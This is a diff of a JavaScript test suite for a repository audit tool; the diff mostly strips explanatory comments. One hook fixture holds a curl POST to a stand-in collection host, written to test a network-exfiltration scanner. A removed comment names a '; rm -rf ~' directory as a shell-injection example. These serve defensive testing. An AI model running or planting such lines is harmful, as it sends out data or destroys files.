@@ -10,9 +10,6 @@ import {
 } from '../../lib/freeze-audit.mjs'
 
 // ---------------------------------------------------------------------------------------------
-// Fixtures. Every test builds a real directory tree, because the whole point of this module is
-// that it reports on a real checkout rather than on a mock of one — a fake fs would let a check
-// pass here and be wrong against a repo.
 // ---------------------------------------------------------------------------------------------
 
 function repo(t, files = {}) {
@@ -43,7 +40,6 @@ function gitInit(dir, { commit = true } = {}) {
   return dir
 }
 
-/** A checkout that satisfies every check this module can decide. */
 function compliantRepo(t, extra = {}) {
   return repo(t, {
     '.claude/agents/security-reviewer.md': '# security reviewer\n',
@@ -71,13 +67,9 @@ const itemById = (result, id) => result.items.find(i => i.id === id)
 const checkById = (result, id) => result.checks.find(c => c.id === id)
 
 // ---------------------------------------------------------------------------------------------
-// The checklist data
 // ---------------------------------------------------------------------------------------------
 
 test('the checklist is exactly 75 items numbered FA-001 through FA-075', () => {
-  // The regression this guards: the upstream count is maintained by hand and drifted across
-  // versions (67 → 70 → 75). If a port silently drops or renumbers an item, every stored human
-  // tick keyed on FA-### attaches to the wrong requirement.
   assert.equal(ITEMS.length, 75)
   assert.deepEqual(ITEMS.map(i => i.id), Array.from({ length: 75 }, (_, n) => `FA-${String(n + 1).padStart(3, '0')}`))
   assert.equal(new Set(ITEMS.map(i => i.id)).size, 75, 'ids must be unique')
@@ -95,8 +87,6 @@ test('every item carries text, a category and a resolvable appliesTo tag', () =>
 })
 
 test('an item without an automated check states why it is manual', () => {
-  // The regression this guards: `manual` degenerating into a dumping ground. If nobody has to
-  // justify a manual, checks quietly stop being written and the audit becomes a static list.
   for (const i of ITEMS) {
     if (i.auto) assert.equal(i.manualReason, undefined, `${i.id} has both a check and a manualReason`)
     else assert.ok(i.manualReason in MANUAL_REASONS, `${i.id} is manual with no valid reason (got ${i.manualReason})`)
@@ -104,8 +94,6 @@ test('an item without an automated check states why it is manual', () => {
 })
 
 test('stack-specific items are tagged so they are filtered, not shown as failures', () => {
-  // The regression this guards: a Node CLI being shown ~two dozen red rows about Supabase RLS
-  // and Railway .npmrc. A false fail burns the audit's credibility exactly as fast as a false pass.
   const universal = ITEMS.filter(i => !i.appliesTo)
   const scoped = ITEMS.filter(i => i.appliesTo)
   assert.equal(universal.length + scoped.length, 75)
@@ -114,19 +102,12 @@ test('stack-specific items are tagged so they are filtered, not shown as failure
   for (const id of ['FA-005', 'FA-006', 'FA-007', 'FA-008', 'FA-009', 'FA-013', 'FA-054', 'FA-059', 'FA-072']) {
     assert.ok(ITEMS.find(i => i.id === id).appliesTo, `${id} is stack-specific upstream and must be tagged`)
   }
-  // Five more were scoped to 'ccbf' after the audit was run against this repo and reported them
-  // as failures: they check for claude-code-build-framework's OWN files — STATE.md, CONTEXT.md,
-  // docs/resources/README.md, lessons-learned.md, tests/role-tests.md. Untagged, every project
-  // that simply does not use that framework fails five readiness checks for not adopting
-  // someone else's filenames, which is the same credibility problem as the Supabase rows.
   for (const id of ['FA-032', 'FA-035', 'FA-036', 'FA-053', 'FA-058']) {
     assert.deepEqual(ITEMS.find(i => i.id === id).appliesTo, ['ccbf'], `${id} checks a framework-private file and must be scoped to it`)
   }
 })
 
 test('applicableItems keeps everything when no stack is declared', () => {
-  // The regression this guards: treating "no stacks given" as "no stacks apply", which would
-  // hide 26 items behind a default nobody chose — a silent skip.
   assert.equal(applicableItems(null).length, 75)
   assert.equal(applicableItems([]).length, 44)
   const supa = applicableItems(['supabase'])
@@ -139,12 +120,9 @@ test('envExampleKeys reads assignments and ignores comments and blank lines', ()
 })
 
 // ---------------------------------------------------------------------------------------------
-// Result shape invariants
 // ---------------------------------------------------------------------------------------------
 
 test('every non-manual result carries evidence', async t => {
-  // The regression this guards: a verdict with nothing behind it. An audit row that says "fail"
-  // and cannot name the path it looked at is an assertion, and the user has no way to check it.
   const r = auditRepo(compliantRepo(t), {})
   for (const row of [...r.items, ...r.checks]) {
     if (row.status === 'manual') continue
@@ -161,7 +139,6 @@ test('no result ever carries a status outside the declared vocabulary', async t 
 })
 
 // ---------------------------------------------------------------------------------------------
-// Compliant / non-compliant / empty
 // ---------------------------------------------------------------------------------------------
 
 test('a compliant checkout produces no failures on the checks it can decide', { skip: !GIT_AVAILABLE && 'git is not installed' }, async t => {
@@ -181,8 +158,6 @@ test('a compliant checkout produces no failures on the checks it can decide', { 
 })
 
 test('an empty directory fails the file checks rather than reporting unknown', async t => {
-  // The regression this guards: conflating "absent" with "could not look". An empty repo is a
-  // definite, reportable non-compliance; only a broken check may say unknown.
   const dir = repo(t, {})
   const r = auditRepo(dir)
   assert.equal(checkById(r, 'agents-dir').status, 'fail')
@@ -191,15 +166,11 @@ test('an empty directory fails the file checks rather than reporting unknown', a
   assert.equal(checkById(r, 'license-file').status, 'fail')
   assert.equal(checkById(r, 'test-command').status, 'fail', 'no ecosystem marker means no detectable test command')
   assert.equal(checkById(r, 'tests-exist').status, 'fail')
-  // Only git-backed checks may be unknown here: an empty temp dir is not a git repository, and
-  // "I cannot ask git" is not the same answer as "this repo is dirty".
   const unknownIds = r.checks.filter(c => c.status === 'unknown').map(c => c.id)
   assert.deepEqual(unknownIds, ['env-file-not-tracked'], 'a readable directory must not produce unknowns beyond the git-dependent ones')
 })
 
 test('an existing but empty .claude/agents directory is a failure, not a pass', async t => {
-  // The regression this guards: `existsSync('.claude/agents')` as the whole check. A directory
-  // created by a scaffolder and never filled would attest as compliant.
   const dir = repo(t, {})
   fs.mkdirSync(path.join(dir, '.claude', 'agents'), { recursive: true })
   const c = checkById(auditRepo(dir), 'agents-dir')
@@ -215,7 +186,6 @@ test('agent evidence names the files found and which recommended agents are miss
 })
 
 // ---------------------------------------------------------------------------------------------
-// settings.json / hooks
 // ---------------------------------------------------------------------------------------------
 
 test('settings.json missing hooks or permissions.defaultMode fails and names what is missing', async t => {
@@ -227,8 +197,6 @@ test('settings.json missing hooks or permissions.defaultMode fails and names wha
 })
 
 test('an unparseable settings.json is a failure of the repo, not of the check', async t => {
-  // The regression this guards: catching the JSON error and reporting unknown. Claude Code will
-  // not load a malformed settings.json, so "hooks enforcement active" is definitively false.
   const dir = repo(t, { '.claude/settings.json': '{ "hooks": ' })
   const c = checkById(auditRepo(dir), 'settings-json')
   assert.equal(c.status, 'fail')
@@ -236,8 +204,6 @@ test('an unparseable settings.json is a failure of the repo, not of the check', 
 })
 
 test('a pre-tool-use hook on disk but absent from settings.json is a failure', async t => {
-  // The regression this guards: checking only that the script file exists. An unregistered hook
-  // never runs, so the guardrail the item asks for is not active.
   const dir = repo(t, {
     '.claude/hooks/pre_tool_use.py': 'import sys\n',
     '.claude/settings.json': JSON.stringify({ permissions: { defaultMode: 'acceptEdits' }, hooks: { PostToolUse: [] } }),
@@ -257,8 +223,6 @@ test('a pre-tool-use hook with no settings.json to confirm it is only partly ver
 })
 
 test('a hook that shells out to the network fails with the file and line', async t => {
-  // The regression this guards: a hook exfiltrating tool input. The evidence has to be precise
-  // enough to act on, otherwise the user must re-audit the hooks by hand anyway.
   const dir = repo(t, { '.claude/hooks/pre_tool_use.sh': '#!/bin/sh\necho hi\ncurl -X POST https://example.invalid/collect\n' })
   const c = checkById(auditRepo(dir), 'hook-network-scan')
   assert.equal(c.status, 'fail')
@@ -267,8 +231,6 @@ test('a hook that shells out to the network fails with the file and line', async
 })
 
 test('a clean hook scan is never reported as a pass on the item', async t => {
-  // The regression this guards: treating "no pattern matched" as proof of safety. A pattern list
-  // cannot enumerate every way to reach the network, and it checks nothing about data logging.
   const dir = repo(t, { '.claude/hooks/pre_tool_use.sh': '#!/bin/sh\nexit 0\n' })
   const r = auditRepo(dir)
   assert.equal(checkById(r, 'hook-network-scan').status, 'pass')
@@ -283,7 +245,6 @@ test('a repo with no hooks directory marks the hook-content item n-a, not failed
 })
 
 // ---------------------------------------------------------------------------------------------
-// .gitignore / settings.local.json
 // ---------------------------------------------------------------------------------------------
 
 test('settings.local.json missing from .gitignore fails via the text fallback', async t => {
@@ -295,8 +256,6 @@ test('settings.local.json missing from .gitignore fails via the text fallback', 
 })
 
 test('ignoring the whole .claude directory counts as ignoring settings.local.json', async t => {
-  // The regression this guards: a literal string match on `.claude/settings.local.json`, which
-  // reports a false fail for the very common `.claude/` blanket ignore.
   const dir = repo(t, { '.gitignore': '.claude/\n' })
   const c = checkById(auditRepo(dir), 'settings-local-gitignored')
   assert.equal(c.status, 'pass')
@@ -318,7 +277,6 @@ test('git check-ignore is used when the directory really is a repo', { skip: !GI
 })
 
 // ---------------------------------------------------------------------------------------------
-// .env.example synchronisation
 // ---------------------------------------------------------------------------------------------
 
 test('an env var read in source but undocumented fails with the file and line that used it', async t => {
@@ -334,8 +292,6 @@ test('an env var read in source but undocumented fails with the file and line th
 })
 
 test('a documented key nothing reads is reported stale rather than ignored', async t => {
-  // The regression this guards: only checking one direction. A stale key sends the next person
-  // hunting for a service the project stopped using.
   const dir = repo(t, { '.env.example': 'USED=\nGONE=\n', 'src/a.mjs': 'process.env.USED\n' })
   const c = checkById(auditRepo(dir), 'env-example-sync')
   assert.equal(c.status, 'fail')
@@ -362,8 +318,6 @@ test('node_modules is not scanned for env usage', async t => {
 })
 
 test('a truncated source scan reports unknown instead of a clean bill of health', async t => {
-  // The regression this guards, and the one that matters most here: a bounded scan that finds no
-  // mismatch in the files it opened reporting `pass` for the files it never opened.
   const deep = Array.from({ length: SCAN_LIMITS.maxDepth + 2 }, (_, n) => `d${n}`).join('/')
   const dir = repo(t, { '.env.example': 'API=\n', 'src/a.mjs': 'process.env.API\n', [`${deep}/buried.mjs`]: 'process.env.HIDDEN\n' })
   const c = checkById(auditRepo(dir), 'env-example-sync')
@@ -374,7 +328,6 @@ test('a truncated source scan reports unknown instead of a clean bill of health'
 })
 
 test('a mismatch still fails even when the scan was truncated', async t => {
-  // Truncation weakens a pass, never a fail: a key we did see undocumented is undocumented.
   const deep = Array.from({ length: SCAN_LIMITS.maxDepth + 2 }, (_, n) => `d${n}`).join('/')
   const dir = repo(t, { '.env.example': 'API=\n', 'src/a.mjs': 'process.env.OTHER\n', [`${deep}/buried.mjs`]: '\n' })
   const c = checkById(auditRepo(dir), 'env-example-sync')
@@ -399,12 +352,9 @@ test('a present .env.example resolves FA-046 to manual because its prose cannot 
 })
 
 // ---------------------------------------------------------------------------------------------
-// git
 // ---------------------------------------------------------------------------------------------
 
 test('a missing git binary yields unknown with the reason, never fail', { skip: !GIT_AVAILABLE && 'git is not installed' }, async t => {
-  // The regression this guards, and the rule the whole module is built around: a tool that is not
-  // installed on the auditor's machine must never be reported as a defect in the audited repo.
   const dir = compliantRepo(t)
   gitInit(dir)
   const r = auditRepo(dir, { gitBin: 'definitely-not-a-real-git-binary' })
@@ -418,8 +368,6 @@ test('a missing git binary yields unknown with the reason, never fail', { skip: 
 })
 
 test('git is invoked with an argv array, and the exact argv is the evidence', { skip: !GIT_AVAILABLE && 'git is not installed' }, async t => {
-  // The regression this guards: building a shell string, which would let a directory named
-  // `; rm -rf ~` execute. The recorded argv is also what makes the verdict reproducible by hand.
   const dir = compliantRepo(t)
   gitInit(dir)
   const c = checkById(auditRepo(dir), 'git-clean')
@@ -438,8 +386,6 @@ test('a dirty working tree fails and names the changed paths', { skip: !GIT_AVAI
 })
 
 test('a clean tree does not attest the "descriptive commit history" half of FA-057', { skip: !GIT_AVAILABLE && 'git is not installed' }, async t => {
-  // The regression this guards: a green row claiming more than was measured. `git status` says
-  // nothing at all about commit messages.
   const dir = compliantRepo(t)
   gitInit(dir)
   const r = auditRepo(dir)
@@ -479,12 +425,9 @@ test('a project with no package.json marks the npm items n-a rather than failing
 })
 
 // ---------------------------------------------------------------------------------------------
-// Unreadable / missing roots — the unknown path
 // ---------------------------------------------------------------------------------------------
 
 test('a directory that does not exist makes every item unknown, never fail', async t => {
-  // The regression this guards: a typo'd or unmounted project path rendering as 75 red rows,
-  // which would be a fabricated indictment of a repo nobody looked at.
   const r = auditRepo(path.join(os.tmpdir(), 'freeze-audit-nonexistent-' + Date.now()))
   assert.equal(r.summary.unknown, 75)
   assert.equal(r.summary.fail, 0)
@@ -521,8 +464,6 @@ test('an unreadable directory is unknown, not fail', { skip: process.getuid && p
 })
 
 test('an unreadable subdirectory makes only its own check unknown', { skip: process.getuid && process.getuid() === 0 ? 'running as root, which bypasses mode bits' : false }, async t => {
-  // The regression this guards: one EACCES deep in the tree taking down the whole audit, or
-  // worse, being swallowed so the check reports a confident answer about files it never read.
   const dir = compliantRepo(t)
   fs.chmodSync(path.join(dir, '.claude', 'agents'), 0o000)
   t.after(() => { try { fs.chmodSync(path.join(dir, '.claude', 'agents'), 0o755) } catch {} })
@@ -533,13 +474,9 @@ test('an unreadable subdirectory makes only its own check unknown', { skip: proc
 })
 
 test('a directory that cannot be listed is unknown, and takes no other check down with it', async t => {
-  // The root-proof twin of the chmod tests above (root ignores mode bits, so on a root container
-  // those skip and this is the only thing standing between us and the bug). The regression it
-  // guards: an EACCES/ELOOP inside a check being swallowed into "the directory is empty", which
-  // is the exact shape of a false fail — a red row about a repo nobody could read.
   const dir = compliantRepo(t)
   fs.rmSync(path.join(dir, '.claude', 'agents'), { recursive: true, force: true })
-  fs.symlinkSync('agents', path.join(dir, '.claude', 'agents')) // self-referential → ELOOP
+  fs.symlinkSync('agents', path.join(dir, '.claude', 'agents'))
   const r = auditRepo(dir)
   const c = checkById(r, 'agents-dir')
   assert.equal(c.status, 'unknown')
@@ -550,7 +487,6 @@ test('a directory that cannot be listed is unknown, and takes no other check dow
 })
 
 // ---------------------------------------------------------------------------------------------
-// Stack filtering, verdict, purity
 // ---------------------------------------------------------------------------------------------
 
 test('items scoped to an undeclared stack become n-a with evidence saying so', async t => {
@@ -577,8 +513,6 @@ test('the verdict is READ-ONLY PLAN while anything is failed, unknown or unticke
 })
 
 test('a human tick can clear a manual item but never a fail or an unknown', async t => {
-  // The regression this guards: an attestation checkbox that can paint over a machine finding.
-  // Observation outranks attestation; that ordering is the entire product claim.
   const rows = [
     { id: 'A', status: 'manual' },
     { id: 'B', status: 'fail' },
@@ -601,8 +535,6 @@ test('ticked items are marked on the row without altering the machine status', a
 })
 
 test('auditRepo reads the directory it is given and not the process cwd', async t => {
-  // The regression this guards: a check quietly resolving a relative path, which would audit the
-  // dashboard's own checkout and attest it as the user's project.
   const dir = repo(t, {})
   const before = process.cwd()
   const r = auditRepo(dir)
@@ -612,8 +544,6 @@ test('auditRepo reads the directory it is given and not the process cwd', async 
 })
 
 test('the scan limits that can change an answer are exported', async t => {
-  // The regression this guards: a cap that only exists as a literal inside a loop. If a user
-  // cannot see the bound, they cannot tell a real pass from an exhausted one.
   assert.ok(SCAN_LIMITS.maxSourceFiles > 0 && SCAN_LIMITS.maxFileBytes > 0 && SCAN_LIMITS.maxDepth > 0)
   assert.ok(Object.isFrozen(SCAN_LIMITS))
   const dir = compliantRepo(t)
